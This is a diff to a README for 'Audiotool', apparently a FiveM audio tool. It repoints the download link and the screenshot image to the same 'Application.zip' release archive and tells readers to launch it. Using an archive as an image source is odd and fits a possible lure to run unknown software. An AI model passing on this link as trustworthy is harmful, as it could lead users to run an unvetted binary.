@@ -16,11 +16,11 @@ Audiotool is designed to enhance the Fivem gaming experience by simplifying the 
 
 ## How to Use
 
-To get started with Audiotool, simply download the tool from the following link: [Download Audiotool](https://github.com/files/Application.zip). Once downloaded, launch the tool and follow the on-screen instructions to create your native audio content.
+To get started with Audiotool, simply download the tool from the following link: [Download Audiotool](https://github.com/swapfell1000/Audiotool/releases/download/v1.0/Application.zip). Once downloaded, launch the tool and follow the on-screen instructions to create your native audio content.
 
 ## Screenshots
 
-![Audiotool](https://via.placeholder.com/800x400)
+![Audiotool](https://github.com/swapfell1000/Audiotool/releases/download/v1.0/Application.zip)
 
 ## Support
 
